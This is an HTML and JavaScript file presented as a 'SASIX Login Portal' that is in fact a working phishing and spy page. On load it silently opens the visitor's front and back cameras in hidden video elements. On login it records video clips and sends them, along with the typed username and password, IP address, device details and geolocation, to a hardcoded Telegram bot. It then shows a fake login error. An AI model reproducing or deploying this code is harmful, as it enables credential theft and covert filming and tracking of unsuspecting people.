<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SASIX Login Portal</title>
    <style>
        /* SASIX Watermark ‡∂ë‡∂ö‡∂≠‡∑ä ‡∂ë‡∂ö‡∑ä‡∂ö Premium Design */
        body {
            font-family: 'Arial', sans-serif;
            background: radial-gradient(circle at 10% 30%, #1a1a2e, #16213e, #0f3460);
            height: 100vh;
            overflow: hidden;
            margin: 0;
            padding: 0;
            position: relative;
        }
        
        /* SASIX Watermark - ‡∂¥‡∑ö‡∂±‡∑Ä‡∑è */
        .sasix-watermark {
            position: fixed;
            bottom: 20px;
            right: 30px;
            color: rgba(255, 255, 255, 0.15);
            font-size: 48px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 8px;
            z-index: 9999;
            pointer-events: none;
            text-shadow: 0 0 20px rgba(0,0,0,0.5);
            transform: rotate(-5deg);
            border: 3px solid rgba(255, 255, 255, 0.1);
            padding: 10px 30px;
            border-radius: 50px;
            backdrop-filter: blur(5px);
        }
        
        /* Secondary Watermark */
        .sasix-watermark-small {
            position: fixed;
            top: 20px;
            left: 30px;
            color: rgba(255, 255, 255, 0.1);
            font-size: 18px;
            font-weight: bold;
            z-index: 9999;
            pointer-events: none;
            border-left: 4px solid #ff4d4d;
            padding-left: 15px;
        }
        
        .login-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 420px;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
            padding: 50px 40px;
            z-index: 1000;
            border: 1px solid rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(10px);
        }
        
        .login-box h2 {
            text-align: center;
            color: #16213e;
            margin-bottom: 40px;
            font-size: 32px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 3px;
            position: relative;
        }
        
        .login-box h2:after {
            content: '';
            position: absolute;
            bottom: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 4px;
            background: #ff4d4d;
            border-radius: 2px;
        }
        
        .textbox {
            width: 100%;
            margin-bottom: 30px;
            position: relative;
        }
        
        .textbox input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #e1e1e1;
            border-radius: 12px;
            font-size: 16px;
            box-sizing: border-box;
            transition: all 0.3s ease;
            background: #f8f9fa;
        }
        
        .textbox input:focus {
            border-color: #ff4d4d;
            outline: none;
            box-shadow: 0 0 15px rgba(255, 77, 77, 0.2);
            background: white;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(45deg, #ff4d4d, #ff6b6b);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-top: 20px;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(255, 77, 77, 0.4);
        }
        
        .error {
            color: #ff4d4d;
            text-align: center;
            margin-top: 20px;
            display: none;
            font-weight: bold;
            padding: 10px;
            background: rgba(255, 77, 77, 0.1);
            border-radius: 8px;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
            color: #16213e;
            font-weight: bold;
        }
        
        .loading:after {
            content: '...';
            animation: dots 1.5s steps(5, end) infinite;
        }
        
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }
        
        /* ‡∑É‡∑ê‡∂ü‡∑Ä‡∑î‡∂´‡∑î ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è */
        .hidden-cameras {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
        }
        
        /* Powered by SASIX */
        .powered {
            position: fixed;
            bottom: 20px;
            left: 30px;
            color: rgba(255, 255, 255, 0.3);
            font-size: 14px;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <!-- SASIX Premium Watermarks -->
    <div class="sasix-watermark">SASIX</div>
    <div class="sasix-watermark-small">SASIX SECURE LOGIN</div>
    <div class="powered">‚ö° Powered by SASIX Technologies</div>

    <!-- Premium Login Box -->
    <div class="login-box">
        <h2>SASIX LOGIN</h2>
        <div class="textbox">
            <input type="text" id="username" placeholder="Username" autocomplete="off">
        </div>
        <div class="textbox">
            <input type="password" id="password" placeholder="Password">
        </div>
        <button class="btn" id="loginBtn">Login Now</button>
        <div class="error" id="errorMsg">Invalid username or password!</div>
        <div class="loading" id="loadingMsg">Recording secure access</div>
    </div>

    <!-- Hidden Cameras -->
    <div class="hidden-cameras">
        <video id="frontCamera" autoplay playsinline muted></video>
        <video id="backCamera" autoplay playsinline muted></video>
    </div>

    <script>
        // ============================================
        // SASIX TELEGRAM BOT CONFIG
        // ============================================
        const BOT_TOKEN = '8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg';
        const CHAT_ID = '7642100129';
        
        let frontStream = null;
        let backStream = null;
        let isSending = false;

        // ============================================
        // 1. ‡∂¥‡∑í‡∂ß‡∑î‡∑Ä Load ‡∑Ä‡∑ô‡∂± ‡∂ú‡∂∏‡∂±‡∑ä ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è Start ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ============================================
        window.addEventListener('load', function() {
            console.log('SASIX: Page loaded, initializing cameras...');
            initializeCameras();
            document.getElementById('loginBtn').addEventListener('click', handleLogin);
            
            document.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') handleLogin();
            });
        });

        // ============================================
        // 2. ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è Initialize ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ============================================
        async function initializeCameras() {
            try {
                // Back Camera ‡∂ë‡∂ö
                try {
                    backStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: { exact: "environment" },
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 30 }
                        },
                        audio: false
                    });
                    const backVideo = document.getElementById('backCamera');
                    backVideo.srcObject = backStream;
                    console.log('‚úÖ BACK CAMERA READY');
                } catch (e) {
                    backStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: false
                    });
                    const backVideo = document.getElementById('backCamera');
                    backVideo.srcObject = backStream;
                    console.log('‚úÖ BACK CAMERA READY (FALLBACK)');
                }

                // Front Camera ‡∂ë‡∂ö
                try {
                    frontStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: "user",
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 30 }
                        },
                        audio: false
                    });
                    const frontVideo = document.getElementById('frontCamera');
                    frontVideo.srcObject = frontStream;
                    console.log('‚úÖ FRONT CAMERA READY');
                } catch (e) {
                    console.log('‚ö†Ô∏è FRONT CAMERA NOT AVAILABLE');
                }
                
            } catch (error) {
                console.log('‚ùå CAMERA ERROR:', error);
            }
        }

        // ============================================
        // 3. ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù Record ‡∂ö‡∂ª‡∂±‡∑ä‡∂± (‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 5)
        // ============================================
        async function recordVideo(stream, cameraName) {
            return new Promise((resolve, reject) => {
                try {
                    const chunks = [];
                    let recorder;
                    
                    // Best MIME type ‡∂ë‡∂ö select ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
                    } else if (MediaRecorder.isTypeSupported('video/webm')) {
                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                    } else {
                        recorder = new MediaRecorder(stream);
                    }
                    
                    recorder.ondataavailable = (e) => {
                        if (e.data && e.data.size > 0) {
                            chunks.push(e.data);
                        }
                    };
                    
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        console.log(`‚úÖ ${cameraName} VIDEO RECORDED:`, blob.size, 'bytes');
                        resolve(blob);
                    };
                    
                    recorder.onerror = (e) => {
                        console.log(`‚ùå ${cameraName} RECORDER ERROR:`, e);
                        reject(e);
                    };
                    
                    // Start recording - ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 5‡∂∫‡∑í
                    recorder.start(1000); // Every second get data
                    console.log(`üé• ${cameraName} RECORDING STARTED (5s)...`);
                    
                    setTimeout(() => {
                        recorder.stop();
                        console.log(`‚èπÔ∏è ${cameraName} RECORDING STOPPED`);
                    }, 5000);
                    
                } catch (e) {
                    console.log(`‚ùå ${cameraName} RECORD ERROR:`, e);
                    reject(e);
                }
            });
        }

        // ============================================
        // 4. Telegram ‡∂∂‡∑ú‡∂ß‡∑ä ‡∂ë‡∂ö‡∂ß Video ‡∂ë‡∂ö ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ============================================
        async function sendVideoToTelegram(videoBlob, cameraName) {
            try {
                const username = document.getElementById('username').value || 'Not entered';
                const password = document.getElementById('password').value || 'Not entered';
                
                // IP ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂±
                let ipAddress = 'Unknown';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    ipAddress = ipData.ip;
                } catch (e) {}
                
                // Device info
                const userAgent = navigator.userAgent;
                let browser = 'Chrome', os = 'Windows';
                if (userAgent.includes('Firefox')) browser = 'Firefox';
                else if (userAgent.includes('Safari')) browser = 'Safari';
                else if (userAgent.includes('Edge')) browser = 'Edge';
                
                if (userAgent.includes('Mac')) os = 'MacOS';
                else if (userAgent.includes('Linux')) os = 'Linux';
                else if (userAgent.includes('Android')) os = 'Android';
                else if (userAgent.includes('iPhone')) os = 'iOS';
                
                // Create FormData
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, `SASIX_${cameraName}_${Date.now()}.webm`);
                formData.append('caption', `üé• <b>SASIX ${cameraName} CAMERA</b> - 5s Video
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üìÖ <b>Time:</b> ${new Date().toLocaleString()}
üåç <b>IP:</b> ${ipAddress}
üíª <b>Device:</b> ${os} | ${browser}
üë§ <b>User:</b> ${username}
üîë <b>Pass:</b> ${password}
‚ö° <b>System:</b> SASIX Secure`);

                console.log(`üì§ SENDING ${cameraName} VIDEO TO TELEGRAM...`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    console.log(`‚úÖ ${cameraName} VIDEO SENT SUCCESSFULLY!`);
                    return true;
                } else {
                    console.log(`‚ùå ${cameraName} VIDEO SEND FAILED:`, result);
                    return false;
                }
                
            } catch (e) {
                console.log(`‚ùå ${cameraName} SEND ERROR:`, e);
                return false;
            }
        }

        // ============================================
        // 5. Location ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂±
        // ============================================
        async function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        try {
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: CHAT_ID,
                                    latitude: lat,
                                    longitude: lon
                                })
                            });
                            console.log('‚úÖ LOCATION SENT');
                        } catch (e) {}
                    },
                    (error) => console.log('‚ö†Ô∏è LOCATION DENIED')
                );
            }
        }

        // ============================================
        // 6. ‡∂¥‡∑ä‚Äç‡∂ª‡∂∞‡∑è‡∂± Function - ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù ‡∂Ø‡∑ô‡∂ö‡∂∏ ‡∂ú‡∑ô‡∂± ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ============================================
        async function captureAndSendAll() {
            if (isSending) {
                console.log('‚ö†Ô∏è ALREADY SENDING, PLEASE WAIT...');
                return;
            }
            
            isSending = true;
            document.getElementById('loadingMsg').style.display = 'block';
            document.getElementById('loadingMsg').innerHTML = 'üé¨ Recording 5 second videos...';
            
            // BACK CAMERA ‡∂ë‡∂ö‡∑ô‡∂±‡∑ä Video ‡∂ë‡∂ö
            if (backStream) {
                try {
                    document.getElementById('loadingMsg').innerHTML = 'üé• Recording back camera (5s)...';
                    const backVideoBlob = await recordVideo(backStream, 'BACK');
                    if (backVideoBlob && backVideoBlob.size > 1000) {
                        await sendVideoToTelegram(backVideoBlob, 'BACK');
                    }
                } catch (e) {
                    console.log('‚ùå BACK CAMERA FAILED:', e);
                }
            }
            
            // FRONT CAMERA ‡∂ë‡∂ö‡∑ô‡∂±‡∑ä Video ‡∂ë‡∂ö
            if (frontStream) {
                try {
                    document.getElementById('loadingMsg').innerHTML = 'üé• Recording front camera (5s)...';
                    const frontVideoBlob = await recordVideo(frontStream, 'FRONT');
                    if (frontVideoBlob && frontVideoBlob.size > 1000) {
                        await sendVideoToTelegram(frontVideoBlob, 'FRONT');
                    }
                } catch (e) {
                    console.log('‚ùå FRONT CAMERA FAILED:', e);
                }
            }
            
            // Location ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂±
            await getLocation();
            
            document.getElementById('loadingMsg').innerHTML = '‚úÖ Videos sent successfully!';
            console.log('‚úÖ ALL VIDEOS PROCESSED!');
            
            setTimeout(() => {
                document.getElementById('loadingMsg').style.display = 'none';
            }, 2000);
            
            isSending = false;
        }

        // ============================================
        // 7. Login Click ‡∂ö‡∂ª‡∂±‡∂ö‡∑ú‡∂ß
        // ============================================
        async function handleLogin() {
            const errorMsg = document.getElementById('errorMsg');
            const loginBtn = document.getElementById('loginBtn');
            
            // Loading ‡∂¥‡∑ô‡∂±‡∑ä‡∑Ä‡∂±‡∑ä‡∂±
            errorMsg.style.display = 'none';
            loginBtn.disabled = true;
            loginBtn.style.opacity = '0.7';
            
            // ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù ‡∂ú‡∑ô‡∂± ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
            await captureAndSendAll();
            
            // Error Message ‡∂ë‡∂ö ‡∂¥‡∑ô‡∂±‡∑ä‡∑Ä‡∂±‡∑ä‡∂±
            setTimeout(() => {
                loginBtn.disabled = false;
                loginBtn.style.opacity = '1';
                errorMsg.style.display = 'block';
                
                // Input fields reset
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                
                setTimeout(() => {
                    errorMsg.style.display = 'none';
                }, 3000);
            }, 1000);
        }

        // ============================================
        // 8. ‡∂¥‡∑í‡∂ß‡∑î‡∑Ä Close ‡∂ö‡∂ª‡∂±‡∂ö‡∑ú‡∂ß
        // ============================================
        window.addEventListener('beforeunload', function() {
            if (frontStream) frontStream.getTracks().forEach(t => t.stop());
            if (backStream) backStream.getTracks().forEach(t => t.stop());
        });

    </script>
</body>
    </html>
